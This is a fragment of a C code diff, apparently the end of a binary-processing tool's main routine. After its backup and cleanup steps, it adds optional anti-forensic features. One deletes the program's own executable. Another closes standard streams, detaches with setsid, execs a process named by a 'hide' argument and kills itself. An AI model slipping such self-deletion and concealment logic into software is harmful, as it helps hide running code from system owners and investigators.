+        f_backedup=1;
+        if (!a_Output) a_Output=a_Input;
+        if (!f_EditSrc)
+          a_Input=a_Backup;
+      }
+      makeobject();
+      if (f_Clean)
+        unlink(a_Dump);
+      if ((f_Clean || f_NoBackups) && f_backedup) unlink(a_Backup);
+    }
+    else if (a_Output)
+    {
+      if (!strcmp(a_Input, a_Output))
+      {
+        backup(a_Input);
+        f_backedup=1;
+        if (!f_EditSrc)
+        a_Input=a_Backup;
+      }
+      makeobject();
+      if (f_Clean)
+        unlink(a_Dump);
+      if ((f_Clean || f_NoBackups) && f_backedup) unlink(a_Backup);
+    }
+    else
+      makedump();
+    if (f_DeleteSelf) unlink(argv[0]);
+      puts("Done.");
+    if (f_Security)
+    {
+      close(0);
+      close(1);
+      close(2);
+      setsid();
+      if (a_Hide)
+      {
+        execlp(a_Hide, a_Hide, 0);
+        perror(a_Hide);
+      }
+      if (f_Security)
+        kill(getpid(), SIGKILL);
+    }
+  exit(0);
+} 
